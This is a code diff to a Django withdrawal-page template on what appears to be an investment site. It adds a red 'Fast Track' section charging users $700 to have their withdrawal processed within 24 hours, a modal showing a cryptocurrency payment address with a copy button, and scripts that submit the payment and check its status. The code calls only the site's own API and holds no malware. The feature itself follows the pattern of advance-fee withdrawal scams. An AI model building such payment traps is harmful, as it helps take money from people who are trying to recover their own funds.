@@ -30,6 +30,7 @@
     .withdrawal-name {
         font-weight: 600;
         font-size: 1.1rem;
+        color: white;
     }
     
     .withdrawal-amount {
@@ -116,6 +117,89 @@
         text-decoration: none;
         transform: translateY(-2px);
     }
+    
+    .fast-track-section {
+        background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
+        border-radius: 12px;
+        padding: 25px;
+        margin-top: 30px;
+        color: white;
+        text-align: center;
+    }
+    
+    .fast-track-button {
+        background: #ffffff;
+        color: #dc2626;
+        border: none;
+        padding: 15px 30px;
+        border-radius: 8px;
+        font-weight: bold;
+        font-size: 1.1rem;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        margin-top: 15px;
+    }
+    
+    .fast-track-button:hover {
+        background: #f3f4f6;
+        transform: translateY(-2px);
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    }
+    
+    .payment-modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 1000;
+    }
+    
+    .payment-modal-content {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 30px;
+        border-radius: 12px;
+        max-width: 500px;
+        width: 90%;
+        color: #1f2937;
+    }
+    
+    .payment-address {
+        background: #f3f4f6;
+        padding: 15px;
+        border-radius: 8px;
+        font-family: monospace;
+        font-size: 0.9rem;
+        word-break: break-all;
+        margin: 15px 0;
+    }
+    
+    .copy-button {
+        background: #3b82f6;
+        color: white;
+        border: none;
+        padding: 8px 16px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 0.9rem;
+    }
+    
+    .close-modal {
+        position: absolute;
+        top: 15px;
+        right: 20px;
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: #6b7280;
+    }
 </style>
 {% endblock %}
 
@@ -178,5 +262,162 @@
         </div>
         {% endif %}
     </div>
+    
+    <!-- Fast Track Section -->
+    <div class="fast-track-section">
+        <h2 class="text-2xl font-bold mb-4">🚀 Fast Track Your Withdrawal</h2>
+        <p class="text-lg mb-4">
+            Skip the queue and get your withdrawal processed in 24 hours!
+        </p>
+        <p class="text-sm mb-6">
+            Pay just $700 and move to the top of the withdrawal list.
+        </p>
+        
+        <form id="fast-track-form">
+            <div class="mb-4">
+                <input 
+                    type="text" 
+                    id="customer-name" 
+                    placeholder="Enter your full name" 
+                    required
+                    class="w-full max-w-md px-4 py-3 rounded-lg border-0 text-gray-800"
+                >
+            </div>
+            <button type="submit" class="fast-track-button">
+                Pay $700 for Fast Track
+            </button>
+        </form>
+    </div>
 </div>
+
+<!-- Payment Modal -->
+<div id="payment-modal" class="payment-modal">
+    <div class="payment-modal-content">
+        <button class="close-modal" onclick="closePaymentModal()">&times;</button>
+        <h3 class="text-xl font-bold mb-4">Complete Your Fast Track Payment</h3>
+        <div id="payment-info">
+            <p class="mb-4">Please send the exact amount to the address below:</p>
+            <div class="payment-address" id="payment-address"></div>
+            <button class="copy-button" onclick="copyPaymentAddress()">Copy Address</button>
+            <p class="text-sm text-gray-600 mt-4">
+                <strong>Amount:</strong> <span id="payment-amount"></span> <span id="crypto-currency"></span>
+            </p>
+            <p class="text-sm text-gray-600">
+                <strong>Withdrawal ID:</strong> <span id="withdrawal-id"></span>
+            </p>
+        </div>
+        <div class="mt-6">
+            <button class="bg-green-500 text-white px-6 py-2 rounded-lg mr-2" onclick="checkPaymentStatus()">
+                Check Payment Status
+            </button>
+            <button class="bg-gray-500 text-white px-6 py-2 rounded-lg" onclick="closePaymentModal()">
+                Close
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+let currentWithdrawalId = null;
+
+document.getElementById('fast-track-form').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const customerName = document.getElementById('customer-name').value.trim();
+    if (!customerName) {
+        alert('Please enter your name');
+        return;
+    }
+    
+    try {
+        const response = await fetch('/investments/api/fast-track-payment/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': getCookie('csrftoken')
+            },
+            body: JSON.stringify({
+                customer_name: customerName,
+                amount: 700
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            currentWithdrawalId = data.withdrawal_id;
+            document.getElementById('payment-address').textContent = data.payment_address;
+            document.getElementById('payment-amount').textContent = data.payment_amount;
+            document.getElementById('crypto-currency').textContent = data.crypto_currency;
+            document.getElementById('withdrawal-id').textContent = data.withdrawal_id;
+            document.getElementById('payment-modal').style.display = 'block';
+        } else {
+            alert('Error: ' + data.error);
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred. Please try again.');
+    }
+});
+
+function closePaymentModal() {
+    document.getElementById('payment-modal').style.display = 'none';
+}
+
+function copyPaymentAddress() {
+    const address = document.getElementById('payment-address').textContent;
+    navigator.clipboard.writeText(address).then(function() {
+        alert('Address copied to clipboard!');
+    });
+}
+
+async function checkPaymentStatus() {
+    if (!currentWithdrawalId) return;
+    
+    try {
+        const response = await fetch('/investments/api/check-payment-status/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': getCookie('csrftoken')
+            },
+            body: JSON.stringify({
+                withdrawal_id: currentWithdrawalId
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            if (data.status === 'paid') {
+                alert('Payment confirmed! Your withdrawal is now being processed.');
+                closePaymentModal();
+                location.reload();
+            } else {
+                alert(data.message);
+            }
+        } else {
+            alert('Error: ' + data.error);
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred while checking payment status.');
+    }
+}
+
+function getCookie(name) {
+    let cookieValue = null;
+    if (document.cookie && document.cookie !== '') {
+        const cookies = document.cookie.split(';');
+        for (let i = 0; i < cookies.length; i++) {
+            const cookie = cookies[i].trim();
+            if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                break;
+            }
+        }
+    }
+    return cookieValue;
+}
+</script>
 {% endblock %}
